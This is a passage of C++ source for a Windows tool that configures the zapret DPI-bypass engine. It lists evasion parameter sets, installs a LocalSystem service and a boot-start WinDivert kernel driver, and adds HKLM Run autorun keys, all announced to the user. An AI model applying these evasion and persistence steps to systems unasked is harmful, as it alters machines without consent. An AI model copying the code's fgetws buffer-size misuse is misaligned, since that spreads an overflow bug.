                   << L"--filter-tcp=443," << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,multisplit --dpi-desync-split-seqovl=681 --dpi-desync-split-pos=1 --dpi-desync-fooling=badseq --dpi-desync-repeats=8 --dpi-desync-split-seqovl-pattern=\"" << BIN << L"\\tls_clienthello_www_google_com.bin\" --dpi-desync-fake-tls-mod=rnd,dupsid,sni=www.google.com --new "
                   << L"--filter-udp=" << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-autottl=2 --dpi-desync-repeats=10 --dpi-desync-any-protocol=1 --dpi-desync-fake-unknown-udp=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --dpi-desync-cutoff=n2";
            break;
            
        case 10: // FAKE TLS AUTO
            params << L"--wf-tcp=80,443," << GameFilter << L" "
                   << L"--wf-udp=443,50000-50100," << GameFilter << L" "
                   << L"--filter-udp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-repeats=11 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                   << L"--filter-udp=50000-50100 --filter-l7=discord,stun --dpi-desync=fake --dpi-desync-repeats=6 --new "
                   << L"--filter-tcp=80 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,fakedsplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                   << L"--filter-tcp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,multidisorder --dpi-desync-split-pos=1,midsld --dpi-desync-repeats=11 --dpi-desync-fooling=md5sig --dpi-desync-fake-tls-mod=rnd,dupsid,sni=www.google.com --new "
                   << L"--filter-udp=443 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-repeats=11 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                   << L"--filter-tcp=80 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,fakedsplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                   << L"--filter-tcp=443," << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,multidisorder --dpi-desync-split-pos=1,midsld --dpi-desync-repeats=11 --dpi-desync-fooling=md5sig --dpi-desync-fake-tls-mod=rnd,dupsid,sni=www.google.com --new "
                   << L"--filter-udp=" << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-autottl=2 --dpi-desync-repeats=10 --dpi-desync-any-protocol=1 --dpi-desync-fake-unknown-udp=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --dpi-desync-cutoff=n2";
            break;
            
        case 11: // FAKE TLS
            params << L"--wf-tcp=80,443," << GameFilter << L" "
                   << L"--wf-udp=443,50000-50100," << GameFilter << L" "
                   << L"--filter-udp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-repeats=8 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                   << L"--filter-udp=50000-50100 --filter-l7=discord,stun --dpi-desync=fake --dpi-desync-repeats=6 --new "
                   << L"--filter-tcp=80 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=3 --dpi-desync-fooling=md5sig --new "
                   << L"--filter-tcp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-ttl=4 --dpi-desync-fake-tls-mod=rnd,rndsni,padencap --new "
                   << L"--filter-udp=443 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-repeats=8 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                   << L"--filter-tcp=80 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=3 --dpi-desync-fooling=md5sig --new "
                   << L"--filter-tcp=443," << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-ttl=4 --dpi-desync-fake-tls-mod=rnd,rndsni,padencap --new "
                   << L"--filter-udp=" << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-autottl=2 --dpi-desync-repeats=12 --dpi-desync-any-protocol=1 --dpi-desync-fake-unknown-udp=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --dpi-desync-cutoff=n3";
            break;
            
        case 12: // ALT МГТС1
            params << L"--wf-tcp=80,443," << GameFilter << L" "
                   << L"--wf-udp=443,50000-50100," << GameFilter << L" "
                   << L"--filter-udp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                   << L"--filter-udp=50000-50100 --filter-l7=discord,stun --dpi-desync=fake --dpi-desync-repeats=6 --new "
                   << L"--filter-tcp=80 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                   << L"--filter-tcp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-autottl=2 --dpi-desync-repeats=6 --dpi-desync-fooling=badseq --dpi-desync-fake-tls=\"" << BIN << L"\\tls_clienthello_www_google_com.bin\" --new "
                   << L"--filter-udp=443 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                   << L"--filter-tcp=80 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                   << L"--filter-tcp=443," << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-autottl=2 --dpi-desync-repeats=6 --dpi-desync-fooling=badseq --dpi-desync-fake-tls=\"" << BIN << L"\\tls_clienthello_www_google_com.bin\" --new "
                   << L"--filter-udp=" << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-autottl=2 --dpi-desync-repeats=10 --dpi-desync-any-protocol=1 --dpi-desync-fake-unknown-udp=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --dpi-desync-cutoff=n2";
            break;
            
        case 13: // ALT МГТС2
            params << L"--wf-tcp=80,443," << GameFilter << L" "
                   << L"--wf-udp=443,50000-50100," << GameFilter << L" "
                   << L"--filter-udp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                   << L"--filter-udp=50000-50100 --filter-l7=discord,stun --dpi-desync=fake --dpi-desync-repeats=6 --new "
                   << L"--filter-tcp=80 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                   << L"--filter-tcp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fooling=md5sig --dpi-desync-fake-tls=\"" << BIN << L"\\tls_clienthello_www_google_com.bin\" --new "
                   << L"--filter-udp=443 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                   << L"--filter-tcp=80 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                   << L"--filter-tcp=443," << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fooling=md5sig --dpi-desync-fake-tls=\"" << BIN << L"\\tls_clienthello_www_google_com.bin\" --new "
                   << L"--filter-udp=" << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-autottl=2 --dpi-desync-repeats=12 --dpi-desync-any-protocol=1 --dpi-desync-fake-unknown-udp=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --dpi-desync-cutoff=n3";
            break;
            
        case 14: // GENERAL1
            params << L"--wf-tcp=80,443," << GameFilter << L" "
                   << L"--wf-udp=443,50000-50100," << GameFilter << L" "
                   << L"--filter-udp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                   << L"--filter-udp=50000-50100 --filter-l7=discord,stun --dpi-desync=fake --dpi-desync-repeats=6 --new "
                   << L"--filter-tcp=80 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                   << L"--filter-tcp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,multidisorder --dpi-desync-split-pos=midsld --dpi-desync-repeats=8 --dpi-desync-fooling=md5sig,badseq --new "
                   << L"--filter-udp=443 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                   << L"--filter-tcp=80 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                   << L"--filter-tcp=443," << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,multidisorder --dpi-desync-split-pos=midsld --dpi-desync-repeats=6 --dpi-desync-fooling=md5sig,badseq --new "
                   << L"--filter-udp=" << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-autottl=2 --dpi-desync-repeats=10 --dpi-desync-any-protocol=1 --dpi-desync-fake-unknown-udp=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --dpi-desync-cutoff=n2";
            break;
            
        case 15: { // Добавляем фигурные скобки
            // ALT FIX CLOUDFLARE SERVICES
            // Создаем файл конфигурации
            cmdFilePath = BIN + L"\\cloudflare_service_config.txt";
            cmdFile.open(cmdFilePath);
            
            if (cmdFile.is_open()) {
                cmdFile << L"--wf-tcp=80,443,2053,2083,2087,2096,8443," << GameFilter << std::endl;
                cmdFile << L"--wf-udp=443,19294-19344,50000-50100," << GameFilter << std::endl;
                cmdFile << L"--filter-tcp=80 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,split2 --dpi-desync-autottl=2 --dpi-desync-fooling=badseq --dpi-desync-badseq-increment=2" << std::endl;
                cmdFile << L"--filter-tcp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-fake-tls-mod=none --dpi-desync-repeats=6 --dpi-desync-fooling=badseq --dpi-desync-badseq-increment=2" << std::endl;
                cmdFile << L"--filter-udp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-repeats=11 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\"" << std::endl;
                cmdFile << L"--filter-tcp=80 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,split2 --dpi-desync-autottl=2 --dpi-desync-fooling=badseq --dpi-desync-badseq-increment=10000000" << std::endl;
                cmdFile << L"--filter-tcp=443 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-fake-tls-mod=none --dpi-desync-repeats=6 --dpi-desync-fooling=badseq --dpi-desync-badseq-increment=10000000" << std::endl;
                cmdFile << L"--filter-udp=443 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-repeats=11 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\"" << std::endl;
                cmdFile << L"--filter-tcp=2053,2083,2087,2096,8443 --hostlist-domains=discord.media --dpi-desync=fake --dpi-desync-fake-tls-mod=none --dpi-desync-repeats=6 --dpi-desync-fooling=badseq --dpi-desync-badseq-increment=2" << std::endl;
                cmdFile << L"--filter-udp=19294-19344,50000-50100 --filter-l7=discord,stun --dpi-desync=fake --dpi-desync-repeats=6" << std::endl;
                cmdFile << L"--filter-tcp=443," << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-fake-tls-mod=none --dpi-desync-repeats=6 --dpi-desync-fooling=badseq --dpi-desync-badseq-increment=10000000" << std::endl;
                cmdFile << L"--filter-udp=" << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-autottl=2 --dpi-desync-repeats=10 --dpi-desync-any-protocol=1 --dpi-desync-fake-unknown-udp=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --dpi-desync-cutoff=n2" << std::endl;
                cmdFile.close();
                
                params << L"--config-file=\"" << cmdFilePath << L"\"";
            } else {
                PrintRed("Ошибка: не удалось создать файл конфигурации для Cloudflare");
                return;
            }
            break;
        }
    }
    
    // Устанавливаем сервис
    std::wstring serviceName = L"zapret";
    std::wstring binPath = L"\"" + BIN + L"\\winws.exe\" " + params.str();
    
    // Останавливаем и удаляем сервис, если он уже существует
    _wsystem((L"net stop " + serviceName).c_str());
    _wsystem((L"sc delete " + serviceName).c_str());
    
    // Создаем сервис с правильным форматированием
    std::wstring createCmd = L"sc create " + serviceName + L" binPath= \"" + binPath + L"\" DisplayName= \"zapret\" start= auto type= own obj= LocalSystem";
    int result = _wsystem(createCmd.c_str());
    
    if (result == 0) {
        // Устанавливаем описание сервиса
        _wsystem((L"sc description " + serviceName + L" \"Zapret DPI bypass software\"").c_str());
        
        // Запускаем сервис
        result = _wsystem((L"sc start " + serviceName).c_str());
        
        if (result == 0) {
            PrintGreen("Сервис успешно установлен и запущен.");
            
            // Сохраняем имя режима в реестре
            std::wstring regCmd = L"reg add \"HKLM\\System\\CurrentControlSet\\Services\\zapret\" /v zapret-discord-youtube /t REG_SZ /d \"ALT" + std::to_wstring(choice) + L"\" /f";
            _wsystem(regCmd.c_str());
            
            // ==================== ПОЛНАЯ НАСТРОЙКА АВТОЗАПУСКА ====================
            PrintYellow("Настройка автозапуска после перезагрузки ПК...");
            std::wstring exePath = exeDir + L"\\FIX_RUNET.exe";
            
            // 1. АВТОЗАПУСК ПРОГРАММЫ (ОДНА точка входа, чтобы избежать дублирования)
            PrintYellow("Добавление программы в автозапуск...");
            
            // Удаляем все старые записи автозапуска для предотвращения дублирования
            _wsystem(L"reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"ZAPRET\" /f >nul 2>&1");
            _wsystem(L"reg delete \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"ZAPRET\" /f >nul 2>&1");
            _wsystem(L"reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v \"ZAPRET_Init\" /f >nul 2>&1");
            _wsystem(L"reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" /v \"ZAPRET\" /f >nul 2>&1");
            _wsystem(L"schtasks /delete /tn \"ZAPRET_AutoStart\" /f >nul 2>&1");
            
            // Добавляем ТОЛЬКО ОДНУ запись автозапуска в HKLM Run
            std::wstring autorun1 = L"reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"ZAPRET\" /t REG_SZ /d \"\\\"" + exePath + L"\\\" /minimized\" /f >nul 2>&1";
            _wsystem(autorun1.c_str());
            
            PrintGreen("Программа добавлена в автозапуск!");
            
            // 2. АВТОЗАПУСК СЛУЖБЫ ZAPRET
            PrintYellow("Настройка автозапуска службы ZAPRET...");
            
            // Настраиваем службу на автоматический запуск
            _wsystem((L"sc config " + serviceName + L" start= auto").c_str());
            
            // Настраиваем задержку запуска (0 = сразу после загрузки)
            _wsystem((L"sc config " + serviceName + L" start= delayed-auto").c_str());
            
            // Настраиваем восстановление при сбое
            _wsystem((L"sc failure " + serviceName + L" reset= 86400 actions= restart/5000/restart/10000/restart/30000").c_str());
            
            PrintGreen("Служба настроена на автоматический запуск!");
            
            // 3. АВТОЗАПУСК ДРАЙВЕРА WinDivert
            PrintYellow("Установка и настройка драйвера WinDivert...");
            std::wstring driverSourcePath = BIN + L"\\WinDivert64.sys";
            std::wstring driverDestPath = L"C:\\Windows\\System32\\drivers\\WinDivert64.sys";
            
            // Копируем драйвер если его нет
            if (GetFileAttributesW(driverDestPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
                if (CopyFileW(driverSourcePath.c_str(), driverDestPath.c_str(), FALSE)) {
                    PrintGreen("Драйвер WinDivert скопирован в системную папку");
                } else {
                    PrintYellow("Не удалось скопировать драйвер (возможно уже существует)");
                }
            } else {
                PrintGreen("Драйвер WinDivert уже установлен");
            }
            
            // Останавливаем и удаляем старую службу драйвера (если есть)
            _wsystem(L"sc stop WinDivert >nul 2>&1");
            _wsystem(L"sc delete WinDivert >nul 2>&1");
            Sleep(500);
            
            // Создаем службу драйвера с автозапуском при загрузке системы
            std::wstring driverServiceCmd = L"sc create WinDivert binPath= \"" + driverDestPath + L"\" type= kernel start= boot DisplayName= \"WinDivert Network Driver\" depend= \"\" >nul 2>&1";
            if (_wsystem(driverServiceCmd.c_str()) == 0) {
                PrintGreen("Служба драйвера создана!");
            }
            
            // Настраиваем драйвер на загрузку при старте системы (boot-start)
            _wsystem(L"sc config WinDivert start= boot >nul 2>&1");
            
            // Запускаем драйвер сейчас
            if (_wsystem(L"sc start WinDivert >nul 2>&1") == 0) {
                PrintGreen("Драйвер WinDivert запущен!");
            } else {
                PrintYellow("Драйвер будет загружен при перезагрузке");
            }
            
            // 4. АВТОМАТИЧЕСКИЙ ЗАПУСК WINWS.EXE после перезагрузки
            PrintYellow("Настройка автозапуска winws.exe...");
            
            // Создаем BAT-файл для запуска winws.exe с текущими параметрами
            std::wstring batPath = exeDir + L"\\start_winws.bat";
            std::wofstream batFile(batPath);
            if (batFile.is_open()) {
                batFile << L"@echo off\n";
                batFile << L"cd /d \"" << BIN << L"\"\n";
                batFile << L"start /min \"\" \"" << BIN << L"\\winws.exe\" " << params.str() << L"\n";
                batFile.close();
                
                // Удаляем старую запись автозапуска winws (если есть)
                _wsystem(L"reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"ZAPRET_WINWS\" /f >nul 2>&1");
                
                // Добавляем BAT-файл в автозапуск
                std::wstring batAutorun = L"reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"ZAPRET_WINWS\" /t REG_SZ /d \"\\\"" + batPath + L"\\\"\" /f >nul 2>&1";
                _wsystem(batAutorun.c_str());
                
                PrintGreen("winws.exe настроен на автозапуск!");
            } else {
                PrintYellow("Не удалось создать скрипт автозапуска winws.exe");
            }
            
            PrintGreen("===========================================================");
            PrintGreen("АВТОЗАПУСК ПОЛНОСТЬЮ НАСТРОЕН!");
            PrintGreen("===========================================================");
            PrintGreen("* Программа запустится автоматически");
            PrintGreen("* Служба ZAPRET запустится автоматически");
            PrintGreen("* Драйвер WinDivert загрузится при старте системы");
            PrintGreen("* winws.exe запустится автоматически");
            PrintGreen("===========================================================");
            
            // Обновляем настройки
            currentSettings.service_installed = true;
            currentSettings.last_run_mode = "service";
            currentSettings.current_alt = choice;
            
            // Создаем лог успешного запуска
            LogSuccessfulStart(exeDir, L"сервис");
        } else {
            PrintRed("Ошибка при запуске сервиса. Код возврата: " + std::to_string(result));
        }
    } else {
        PrintRed("Ошибка при установке сервиса. Код возврата: " + std::to_string(result));
        PrintYellow("Команда установки: " + WStringToString(createCmd));
    }
}

// Функция для переключения GAME
void ToggleGame(const std::wstring& exeDir) {
    std::wstring gameFlagFile = exeDir + L"\\bin\\game_filter.enabled";
    
    // Проверяем существование файла
    DWORD attrib = GetFileAttributesW(gameFlagFile.c_str());
    
    if (attrib == INVALID_FILE_ATTRIBUTES) {
        // Включаем GAME
        PrintYellow("Включение GAME фильтра...");
        
        std::wofstream file(gameFlagFile);
        if (file.is_open()) {
            file << L"ENABLED" << std::endl;
            file.close();
            PrintGreen("GAME фильтр включен. Перезапустите zapret для применения изменений.");
            currentSettings.game_enabled = true;
            
            // Устанавливаем переменную окружения GameFilter
            _wputenv_s(L"GameFilter", L"1024-65535");
        } else {
            PrintRed("Ошибка при создании файла.");
        }
    } else {
        // Отключаем GAME
        PrintYellow("Отключение GAME фильтра...");
        
        if (DeleteFileW(gameFlagFile.c_str())) {
            PrintGreen("GAME фильтр отключен. Перезапустите zapret для применения изменений.");
            currentSettings.game_enabled = false;
            
            // Устанавливаем переменную окружения GameFilter
            _wputenv_s(L"GameFilter", L"12");
        } else {
            PrintRed("Ошибка при удалении файла.");
        }
    }
}

// Функция для переключения IPSET
void ToggleIpset(const std::wstring& exeDir) {
    std::wstring listFile = exeDir + L"\\lists\\ipset-all.txt";
    std::wstring backupFile = listFile + L".backup";
    
    // Проверяем, существует ли файл
    DWORD attrib = GetFileAttributesW(listFile.c_str());
    if (attrib == INVALID_FILE_ATTRIBUTES) {
        PrintRed("Ошибка: файл " + WStringToString(listFile) + " не найден.");
        return;
    }
    
    // Читаем файл для проверки статуса
    std::wifstream file(listFile);
    std::wstring line;
    bool isEmpty = false;
    
    if (file.is_open()) {
        while (std::getline(file, line)) {
            if (line.find(L"0.0.0.0/32") != std::wstring::npos) {
                isEmpty = true;
                break;
            }
        }
        file.close();
    }
    
    if (isEmpty) {
        // Включаем IPSET
        PrintYellow("Включение IPSET...");
        
        // Проверяем наличие резервной копии
        if (GetFileAttributesW(backupFile.c_str()) != INVALID_FILE_ATTRIBUTES) {
            // Восстанавливаем из резервной копии
            DeleteFileW(listFile.c_str());
            MoveFileW(backupFile.c_str(), listFile.c_str());
            PrintGreen("IPSET включен. Данные восстановлены из резервной копии.");
        } else {
            PrintRed("Ошибка: нет резервной копии для восстановления. Обновите список через меню сервиса.");
        }
        
        currentSettings.ipset_enabled = true;
    } else {
        // Отключаем IPSET
        PrintYellow("Отключение IPSET...");
        
        // Создаем резервную копию, если ее нет
        if (GetFileAttributesW(backupFile.c_str()) == INVALID_FILE_ATTRIBUTES) {
            MoveFileW(listFile.c_str(), backupFile.c_str());
        } else {
            DeleteFileW(backupFile.c_str());
            MoveFileW(listFile.c_str(), backupFile.c_str());
        }
        
        // Создаем пустой файл
        std::wofstream newFile(listFile);
        if (newFile.is_open()) {
            newFile << L"0.0.0.0/32" << std::endl;
            newFile.close();
            PrintGreen("IPSET отключен.");
        } else {
            PrintRed("Ошибка при создании файла.");
        }
        
        currentSettings.ipset_enabled = false;
    }
    
    // Перезапускаем сервис, если он установлен
    if (currentSettings.service_installed) {
        std::wstring serviceName = L"zapret";
        _wsystem((L"net stop " + serviceName).c_str());
        _wsystem((L"sc delete " + serviceName).c_str());
        
        // Завершаем процессы winws.exe
        _wsystem(L"taskkill /IM winws.exe /F");
    }
}

// Функция для диагностики
void RunDiagnostics() {
    // Проверка Base Filtering Engine
    FILE* pipe = _wpopen(L"sc query BFE", L"r");
    if (pipe) {
        wchar_t buffer[128];
        std::wstring output = L"";
        
        while (fgetws(buffer, sizeof(buffer), pipe) != NULL) {
            output += buffer;
        }
        _pclose(pipe);
        
        if (output.find(L"RUNNING") != std::wstring::npos) {
            PrintGreen("Base Filtering Engine запущен.");
        } else {
            PrintRed("[X] Base Filtering Engine не запущен. Этот сервис необходим для работы zapret.");
        }
    }
    
    // Проверка Adguard
    pipe = _wpopen(L"tasklist /FI \"IMAGENAME eq AdguardSvc.exe\"", L"r");
    if (pipe) {
        wchar_t buffer[128];
        std::wstring output = L"";
        
        while (fgetws(buffer, sizeof(buffer), pipe) != NULL) {
            output += buffer;
        }
        _pclose(pipe);
        
        if (output.find(L"AdguardSvc.exe") != std::wstring::npos) {
            PrintRed("[X] Обнаружен процесс Adguard. Adguard может вызывать проблемы с Discord.");
            PrintRed("https://github.com/Flowseal/zapret-discord-youtube/issues/417");
        } else {
            PrintGreen("Проверка Adguard пройдена.");
        }
    }
    
    // Проверка Killer
    pipe = _wpopen(L"sc query | findstr /I \"Killer\"", L"r");
    if (pipe) {
        wchar_t buffer[128];
        std::wstring output = L"";
        
        while (fgetws(buffer, sizeof(buffer), pipe) != NULL) {
            output += buffer;
        }
        _pclose(pipe);
        
        if (output.find(L"Killer") != std::wstring::npos) {
            PrintRed("[X] Обнаружены сервисы Killer. Killer конфликтует с zapret.");
            PrintRed("https://github.com/Flowseal/zapret-discord-youtube/issues/2512#issuecomment-2821119513");
        } else {
            PrintGreen("Проверка Killer пройдена.");
        }
    }
    
    // Проверка Intel Connectivity
    pipe = _wpopen(L"sc query | findstr /I \"Intel\" | findstr /I \"Connectivity\" | findstr /I \"Network\"", L"r");
    if (pipe) {
        wchar_t buffer[128];
        std::wstring output = L"";
        
        while (fgetws(buffer, sizeof(buffer), pipe) != NULL) {
            output += buffer;
        }
        _pclose(pipe);
        
        if (output.find(L"Intel") != std::wstring::npos) {
            PrintRed("[X] Обнаружен сервис Intel Connectivity Network Service. Он конфликтует с zapret.");
            PrintRed("https://github.com/ValdikSS/GoodbyeDPI/issues/541#issuecomment-2661670982");
        } else {
            PrintGreen("Проверка Intel Connectivity пройдена.");
        }
    }
    
    // Проверка Check Point
    pipe = _wpopen(L"sc query | findstr /I \"TracSrvWrapper\"", L"r");
    bool checkpointFound = false;
    if (pipe) {
        wchar_t buffer[128];
        std::wstring output = L"";
        
        while (fgetws(buffer, sizeof(buffer), pipe) != NULL) {
            output += buffer;
        }
        _pclose(pipe);
        
        if (output.find(L"TracSrvWrapper") != std::wstring::npos) {
            checkpointFound = true;
        }
    }
    
    pipe = _wpopen(L"sc query | findstr /I \"EPWD\"", L"r");
    if (pipe) {
        wchar_t buffer[128];
        std::wstring output = L"";
        
        while (fgetws(buffer, sizeof(buffer), pipe) != NULL) {
            output += buffer;
        }
        _pclose(pipe);
        
        if (output.find(L"EPWD") != std::wstring::npos) {
            checkpointFound = true;
        }
    }
    
    if (checkpointFound) {
        PrintRed("[X] Обнаружены сервисы Check Point. Check Point конфликтует с zapret.");
        PrintRed("Попробуйте удалить Check Point.");
    } else {
        PrintGreen("Проверка Check Point пройдена.");
    }
    
    // Проверка SmartByte
    pipe = _wpopen(L"sc query | findstr /I \"SmartByte\"", L"r");
    if (pipe) {
        wchar_t buffer[128];
        std::wstring output = L"";
        
        while (fgetws(buffer, sizeof(buffer), pipe) != NULL) {
            output += buffer;
        }
        _pclose(pipe);
        
        if (output.find(L"SmartByte") != std::wstring::npos) {
            PrintRed("[X] Обнаружены сервисы SmartByte. SmartByte конфликтует с zapret.");
            PrintRed("Попробуйте удалить или отключить SmartByte через services.msc");
        } else {
            PrintGreen("Проверка SmartByte пройдена.");
        }
    }
    
    // Проверка VPN
    pipe = _wpopen(L"sc query | findstr /I \"VPN\"", L"r");
    if (pipe) {
        wchar_t buffer[128];
        std::wstring output = L"";
        
        while (fgetws(buffer, sizeof(buffer), pipe) != NULL) {
            output += buffer;
        }
        _pclose(pipe);
        
        if (output.find(L"VPN") != std::wstring::npos) {
            PrintYellow("[?] Обнаружены VPN сервисы. Некоторые VPN могут конфликтовать с zapret.");
            PrintYellow("Убедитесь, что все VPN отключены.");
        } else {
            PrintGreen("Проверка VPN пройдена.");
        }
    }
    
    // Проверка WinDivert конфликтов
    pipe = _wpopen(L"tasklist /FI \"IMAGENAME eq winws.exe\"", L"r");
    bool winws_running = false;
    if (pipe) {
        wchar_t buffer[128];
        std::wstring output = L"";
        
        while (fgetws(buffer, sizeof(buffer), pipe) != NULL) {
            output += buffer;
        }
        _pclose(pipe);
        
        if (output.find(L"winws.exe") != std::wstring::npos) {
            winws_running = true;
        }
    }
    
    pipe = _wpopen(L"sc query WinDivert", L"r");
    bool windivert_running = false;
    if (pipe) {
        wchar_t buffer[128];
        std::wstring output = L"";
        
        while (fgetws(buffer, sizeof(buffer), pipe) != NULL) {
            output += buffer;
        }
        _pclose(pipe);
        
        if (output.find(L"RUNNING") != std::wstring::npos || output.find(L"STOP_PENDING") != std::wstring::npos) {
            windivert_running = true;
        }
    }
    
    if (!winws_running && windivert_running) {
        PrintYellow("[?] winws.exe не запущен, но сервис WinDivert активен. Попытка удалить WinDivert...");
        
        _wsystem(L"net stop \"WinDivert\"");
        _wsystem(L"sc delete \"WinDivert\"");
        
        pipe = _wpopen(L"sc query WinDivert", L"r");
        if (pipe) {
            wchar_t buffer[128];
            std::wstring output = L"";
            
            while (fgetws(buffer, sizeof(buffer), pipe) != NULL) {
                output += buffer;
            }
            _pclose(pipe);
            
            if (output.find(L"WinDivert") == std::wstring::npos) {
                PrintGreen("WinDivert успешно удален.");
            } else {
                PrintRed("[X] Не удалось удалить WinDivert. Проверка конфликтующих сервисов...");
                
                // Проверка конфликтующих сервисов
                std::vector<std::wstring> conflicting_services = {L"GoodbyeDPI", L"discordfix_zapret", L"winws1", L"winws2"};
                bool found_conflict = false;
                
                for (const auto& service : conflicting_services) {
                    FILE* pipe2 = _wpopen((L"sc query \"" + service + L"\"").c_str(), L"r");
                    if (pipe2) {
                        wchar_t buffer[128];
